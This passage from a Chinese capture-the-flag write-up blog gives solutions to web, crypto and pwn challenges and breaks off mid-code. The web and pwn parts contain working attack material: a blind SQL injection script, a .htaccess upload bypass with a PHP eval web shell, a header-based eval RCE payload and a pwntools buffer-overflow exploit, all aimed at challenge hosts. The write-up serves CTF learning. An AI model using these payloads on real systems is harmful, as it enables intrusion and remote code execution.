class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8c704eaf-a795-49b7-9951-a7b2f4811142.node4.buuoj.cn:81/?id=TMP0929&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select变量就写什么子查询语句</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span> <span class="comment">#获取所有库名</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span> <span class="comment">#获取表名</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;here_is_flag&#x27;&quot;</span><span class="comment">#获取字段名</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select flag from ctf.here_is_flag&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造SQL语句，发起请求</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; AND subStr((selEct database()) ,&#123;i&#125;,1) = &#x27;&#123;ch&#125;&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; AND subStr((SELECT flag FROM here_is_flag) ,<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据回显判断，如果得到了表示查询成功的回显，那么说明判断数据的这一位是正确的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) &lt; <span class="number">66</span> :  <span class="comment">#buu有429  sleep一下</span></span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;class_name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"></span><br><span class="line">            result += ch</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(url+payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># 这一位已经跑出来了，可以break掉然后下一轮循环跑下一位数据了</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果已经跑到了字母表最后一位都还没有进到上面的if然后break，说明这轮循环没跑出来正确结果，说明注入完成（或者注入payload写的有问题注入失败），脚本没必要继续跑下去了</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># if ch == alphabet[-1]:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     print(&quot;注入完成&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     exit(0)</span></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010165429.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-Upload-again"><a href="#WEEK2-WEB-Upload-again" class="headerlink" title="WEEK2|WEB  Upload again!"></a>WEEK2|WEB  Upload again!</h5><p>白名单，直接穿htaccess,包含即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;.htaccess&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;g&#x27;]);&lt;/script&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010212627.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-R-C-E"><a href="#WEEK2-WEB-R-C-E" class="headerlink" title="WEEK2|WEB  R!!C!!E!!"></a>WEEK2|WEB  R!!C!!E!!</h5><p>扫描目录得到git泄露，访问/.git/index得到源码，打开乱码，不过可以看到bo0g1pop.php<br><img src="/images/xinshengsai/20231011093422.png" alt="image-20220126203415648"><br>访问一下，无参数rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有过滤getallheaders,直接用这个<br>GET /bo0g1pop.php?star=print_r(getallheaders());<br>先输出所有的header<br><img src="/images/xinshengsai/20231011105148.png" alt="image-20220126203415648"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">current() -输出数组中的当前元素的值。</span><br></pre></td></tr></table></figure><p>然后挑一下上面那个指向数组的没有被ban，使用next<br><img src="/images/xinshengsai/20231011105427.png" alt="image-20220126203415648"><br>，可以看到输出了ua，那调用这个ua，恶意传参即可，把print改成eval<br>/bo0g1pop.php?star=eval(next(getallheaders()));<br><img src="/images/xinshengsai/20231011105540.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231011105651.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-brainfuck"><a href="#WEEK1-CRYPTO-brainfuck" class="headerlink" title="WEEK1|CRYPTO brainfuck"></a>WEEK1|CRYPTO brainfuck</h5><p>随波逐流即可<br><img src="/images/xinshengsai/20231010165600.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Caesar’s-Secert"><a href="#WEEK1-CRYPTO-Caesar’s-Secert" class="headerlink" title="WEEK1|CRYPTO Caesar’s Secert"></a>WEEK1|CRYPTO Caesar’s Secert</h5><p><img src="/images/xinshengsai/20231010165735.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Fence"><a href="#WEEK1-CRYPTO-Fence" class="headerlink" title="WEEK1|CRYPTO Fence"></a>WEEK1|CRYPTO Fence</h5><p><img src="/images/xinshengsai/20231010165811.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Vigenere"><a href="#WEEK1-CRYPTO-Vigenere" class="headerlink" title="WEEK1|CRYPTO Vigenère"></a>WEEK1|CRYPTO Vigenère</h5><p><code>https://www.guballa.de/vigenere-solver</code><br><img src="/images/xinshengsai/20231013160101.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyencoding"><a href="#WEEK1-CRYPTO-babyencoding" class="headerlink" title="WEEK1|CRYPTO babyencoding"></a>WEEK1|CRYPTO babyencoding</h5><p>base64<br><img src="/images/xinshengsai/20231013161304.png" alt="image-20220126203415648"><br>base32<br><img src="/images/xinshengsai/20231013161544.png" alt="image-20220126203415648"><br>uuencode<br><a href="http://www.atoolbox.net/Tool.php?Id=731">http://www.atoolbox.net/Tool.php?Id=731</a><br><img src="/images/xinshengsai/20231013161254.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Small-d"><a href="#WEEK1-CRYPTO-Small-d" class="headerlink" title="WEEK1|CRYPTO  Small d"></a>WEEK1|CRYPTO  Small d</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>e很大，维纳攻击<br><img src="/images/xinshengsai/20231013162824.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyrsa"><a href="#WEEK1-CRYPTO-babyrsa" class="headerlink" title="WEEK1|CRYPTO babyrsa"></a>WEEK1|CRYPTO babyrsa</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)  <span class="comment">#32位n</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将n进行分解<br><img src="/images/xinshengsai/20231020100522.png" alt="image-20220126203415648"><br>根据代码得到，n是15个素数相乘得来的，那么，fn就的所有素数-1然后相乘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> distutils.util <span class="keyword">import</span> run_2to3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2    </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p=<span class="number">2217990919</span></span><br><span class="line"></span><br><span class="line">q=<span class="number">2338725373</span></span><br><span class="line"></span><br><span class="line">r3=<span class="number">2370292207</span></span><br><span class="line"></span><br><span class="line">r4=<span class="number">2463878387</span></span><br><span class="line"></span><br><span class="line">r5=<span class="number">2706073949</span></span><br><span class="line"></span><br><span class="line">r6=<span class="number">2794985117</span></span><br><span class="line"></span><br><span class="line">r7=<span class="number">2804303069</span></span><br><span class="line"></span><br><span class="line">r8=<span class="number">2923072267</span></span><br><span class="line"></span><br><span class="line">r9=<span class="number">2970591037</span></span><br><span class="line"></span><br><span class="line">r10=<span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">r11=<span class="number">3654864131</span></span><br><span class="line"></span><br><span class="line">r12=<span class="number">3831680819</span></span><br><span class="line"></span><br><span class="line">r13=<span class="number">3939901243</span></span><br><span class="line"></span><br><span class="line">r14=<span class="number">4093178561</span></span><br><span class="line"></span><br><span class="line">r15=<span class="number">4278428893</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q*r3 *r4 *r5 *r6 *r7 *r8*r9*r10*r11*r12*r13*r14*r15</span><br><span class="line"></span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r3-<span class="number">1</span>)*(r4-<span class="number">1</span>)*(r5-<span class="number">1</span>)*(r6-<span class="number">1</span>)*(r7-<span class="number">1</span>)*(r8-<span class="number">1</span>)*(r9-<span class="number">1</span>)*(r10-<span class="number">1</span>)*(r11-<span class="number">1</span>)*(r12-<span class="number">1</span>)*(r13-<span class="number">1</span>)*(r14-<span class="number">1</span>)*(r15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># invert是求乘法逆元    </span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(d))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,<span class="built_in">int</span>(d),n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-babyxor"><a href="#WEEK1-CRYPTO-babyxor" class="headerlink" title="WEEK1|CRYPTO  babyxor"></a>WEEK1|CRYPTO  babyxor</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from secret import *</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment">#     ciphertext.append(f ^ key)</span></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>]^j == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>):</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line"><span class="comment">#先用第一个e9亦或1-255，得出key，key为143，在所有的都亦或14</span></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^<span class="number">143</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> <span class="comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125; </span></span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-Vigenere-1"><a href="#WEEK1-CRYPTO-Vigenere-1" class="headerlink" title="WEEK1|CRYPTO Vigenère"></a>WEEK1|CRYPTO Vigenère</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag import flag, key</span></span><br><span class="line"><span class="comment"># modulus = 256</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment">#     ciphertext.append((key[0]*f + key[1]) % modulus)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) + j) % modulus ==s[<span class="number">0</span>]  <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>) + j) % modulus ==s[<span class="number">1</span>]  <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + j) % modulus == s[<span class="number">2</span>] :</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(i,j)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">a,b = <span class="number">17</span>,<span class="number">23</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a*k + b)%<span class="number">256</span> == s[i]:</span><br><span class="line"></span><br><span class="line">            flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span></span><br></pre></td></tr></table></figure><p>根据源码知道，a*flag+b =c字符，那么，设个方程即可，解出来后，再带回去，即可。</p><h5 id="WEEK1-PWN-ret2text"><a href="#WEEK1-PWN-ret2text" class="headerlink" title="WEEK1|PWN  ret2text"></a>WEEK1|PWN  ret2text</h5><p>  /pwn/xinshengsai ❯ checksec ret2text                    ✘ INT  1m 16s root@Bohemian  11:08:48<br>[<em>] Checking for new versions of pwntools<br>    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to ‘ever’ (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[</em>] A newer version of pwntools is available on pypi (4.8.0 –&gt; 4.11.0).<br>    Update with: $ pip install -U pwntools<br>[*] ‘/pwn/xinshengsai/ret2text’<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>没有开保护<br><img src="/images/xinshengsai/20231102112114.png" alt="image-20220126203415648"><br>拖到ida有binbash,<br><img src="/images/xinshengsai/20231102112146.png" alt="image-20220126203415648"><br>溢出的话是20+8<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29481</span>)</span><br><span class="line">backdoor = <span class="number">0x401212</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-Vigenere"><a href="#WEEK1-PWN-Vigenere" class="headerlink" title="WEEK1|PWN Vigenère"></a>WEEK1|PWN Vigenère</h5><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 